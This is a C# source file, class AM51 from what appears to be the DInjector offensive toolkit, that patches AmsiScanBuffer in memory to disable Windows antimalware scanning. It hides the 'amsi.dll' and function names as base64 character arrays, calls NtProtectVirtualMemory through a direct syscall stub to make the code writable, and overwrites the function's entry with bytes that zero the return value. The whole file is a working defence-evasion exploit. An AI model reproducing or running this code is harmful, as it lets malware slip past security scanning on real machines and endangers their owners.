using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class AM51
    {
        // mov    eax,0x80070057 (E_INVALIDARG); ret
        //private static readonly byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        //private static readonly byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        // xor rax, rax
        private static readonly byte[] x64 = new byte[] { 0x48, 0x31, 0xC0 };

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr LoadLibraryA(
            string libFileName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        public static void Patch()
        {
            ChangeBytes(x64);
        }

        private static IntPtr loadLibraryA(string libFileName)
        {
            object[] parameters = { libFileName };
            var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "LoadLibraryA", typeof(LoadLibraryA), ref parameters);

            return result;
        }

        private static IntPtr getProcAddress(IntPtr hModule, string procName)
        {
            object[] parameters = { hModule, procName };
            var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "GetProcAddress", typeof(GetProcAddress), ref parameters);

            return result;
        }

        private static void ChangeBytes(byte[] patch)
        {
            try
            {
                #region LoadLibraryA ("amsi.dll")

                var libNameB64 = new char[] { 'Y', 'W', '1', 'z', 'a', 'S', '5', 'k', 'b', 'G', 'w', '=' };
                var libName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", libNameB64)));
                var hModule = loadLibraryA(libName);

                #endregion

                #region GetProcAddress ("AmsiScanBuffer")

                var procNameB64 = new char[] { 'Q', 'W', '1', 'z', 'a', 'V', 'N', 'j', 'Y', 'W', '5', 'C', 'd', 'W', 'Z', 'm', 'Z', 'X', 'I', '=' };
                var procName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", procNameB64)));
                var procAddress = getProcAddress(hModule, procName);

                #endregion

                #region NtProtectVirtualMemory (PAGE_READWRITE)

                IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
                NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

                DI.Data.Native.NTSTATUS ntstatus;
                IntPtr hProcess = Process.GetCurrentProcess().Handle;
                IntPtr protectAddress = procAddress;
                var regionSize = (IntPtr)patch.Length;
                uint oldProtect = 0;

                ntstatus = sysNtProtectVirtualMemory(
                    hProcess,
                    ref protectAddress,
                    ref regionSize,
                    DI.Data.Win32.WinNT.PAGE_READWRITE,
                    out oldProtect);

                if (ntstatus == 0)
                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, PAGE_READWRITE");
                else
                    Console.WriteLine($"(AM51) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

                Console.WriteLine("(AM51) [>] Patching at address: " + string.Format("{0:X}", procAddress.ToInt64()));
                Marshal.Copy(patch, 0, procAddress, patch.Length);

                #endregion

                #region NtProtectVirtualMemory (oldProtect)

                regionSize = (IntPtr)patch.Length;

                ntstatus = sysNtProtectVirtualMemory(
                    hProcess,
                    ref procAddress,
                    ref regionSize,
                    oldProtect,
                    out uint _);

                if (ntstatus == 0)
                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, oldProtect");
                else
                    Console.WriteLine($"(AM51) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

                #endregion
            }
            catch (Exception e)
            {
                Console.WriteLine($"(AM51) [x] {e.Message}");
                Console.WriteLine($"(AM51) [x] {e.InnerException}");
            }
        }
    }
}
